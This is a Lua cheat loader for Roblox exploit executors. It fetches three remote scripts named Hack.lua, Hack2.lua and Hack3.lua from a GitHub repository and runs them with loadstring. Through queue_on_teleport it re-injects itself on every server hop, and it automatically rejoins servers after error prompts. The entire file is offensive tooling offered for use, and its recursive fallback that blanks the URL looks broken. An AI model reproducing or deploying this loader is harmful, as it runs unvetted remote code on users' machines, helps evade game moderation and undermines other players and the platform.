local queue_on_teleport = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)

-- We wrap the core script AND the 3 external scripts inside the string
local scriptString = [[
    -- ==========================================
    -- 1. EXECUTE YOUR 3 EXTERNAL SCRIPTS
    -- ==========================================
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/quesopolisa-ai/Sigma/refs/heads/main/Hack.lua"))()
        end)
    end)
    
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/quesopolisa-ai/Sigma/refs/heads/main/Hack2.lua"))()
        end)
    end)
    
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/quesopolisa-ai/Sigma/refs/heads/main/Hack3.lua"))()
        end)
    end)

    -- ==========================================
    -- 2. AUTO-REJOIN LOGIC
    -- ==========================================
    local TeleportService = game:GetService("TeleportService")
    local CoreGui = game:GetService("CoreGui")
    local Players = game:GetService("Players")

    -- Fallback: If teleporting to the specific instance fails (e.g., server is full), teleport to any available server
    TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
        TeleportService:Teleport(game.PlaceId, player)
    end)

    local promptOverlay = CoreGui:WaitForChild("RobloxPromptGui"):WaitForChild("promptOverlay")

    promptOverlay.ChildAdded:Connect(function(child)
        if child.Name == 'ErrorPrompt' then
            task.wait(2)
            
            -- Attempt to join the exact same server first
            if game.JobId ~= "" then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)
            else
                -- Failsafe if JobId is somehow missing
                TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
            end
        end
    end)
]]

-- Function to run the logic and queue it for the next server hop
local function applyScriptsAndRejoin()
    -- 1. Queue this exact same logic to run again in the next server
    if queue_on_teleport then
        -- We package the executor code so it continues to loop infinitely on every server hop
        local recursiveCode = [[
            local queue_on_teleport = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)
            local scriptString = ]] .. "[[" .. scriptString .. "]]" .. [[
            
            local function applyScripts()
                if queue_on_teleport then
                    -- Re-queue itself
                    queue_on_teleport(script.Source or "loadstring(game:HttpGet('YOUR_URL_HERE'))()")
                end
                loadstring(scriptString)()
            end
            applyScripts()
        ]]
        
        -- Fallback string replace to ensure the recursive code injects itself
        recursiveCode = recursiveCode:gsub("YOUR_URL_HERE", "") 
        
        queue_on_teleport(recursiveCode)
    end
    
    -- 2. Run the script for the current server
    loadstring(scriptString)()
end

-- Execute everything
applyScriptsAndRejoin()
